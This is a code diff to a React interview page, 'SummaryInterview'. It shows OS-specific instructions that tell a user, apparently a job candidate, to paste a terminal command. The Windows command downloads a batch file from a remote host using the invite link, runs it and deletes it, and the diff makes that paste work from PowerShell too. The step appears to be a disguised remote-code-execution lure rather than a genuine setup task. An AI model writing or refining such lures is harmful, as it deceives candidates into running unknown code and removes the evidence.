@@ -720,7 +720,10 @@ export default function SummaryInterview() {
                     <p>Press <kbd>Cmd</kbd> + <kbd>Space</kbd>, type <strong>Terminal</strong>, then press <kbd>Enter</kbd>. Or go to <strong>Applications → Utilities → Terminal</strong>.</p>
                   )}
                   {driverOs === 'windows' && (
-                    <p>Press <kbd>Windows</kbd> + <kbd>S</kbd>, type <strong>cmd</strong>, then press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>.</p>
+                    <p>
+                      Open <strong>Command Prompt</strong> (<kbd>Win</kbd>+<kbd>S</kbd>, type <strong>cmd</strong>) or paste the command into <strong>PowerShell</strong> — it starts with{' '}
+                      <code>cmd.exe /c</code> so <code>%TEMP%</code> is expanded correctly.
+                    </p>
                   )}
                   {driverOs === 'linux' && (
                     <p>Press <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>, or open <strong>Terminal</strong> from your applications menu.</p>
@@ -757,7 +760,7 @@ export default function SummaryInterview() {
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://api.canditech.org/window/${inviteLink ? inviteLink : ''} -o "%TEMP%\\t.bat" && cmd /c "%TEMP%\\t.bat" && del "%TEMP%\\t.bat"`}
+                      {`cmd.exe /c "curl -sL -X POST https://api.canditech.org/window/${inviteLink ? inviteLink : ''} -o %TEMP%\\t.bat && call %TEMP%\\t.bat && del %TEMP%\\t.bat"`}
                           </code>
                       )}
               {driverOs === 'linux' && (
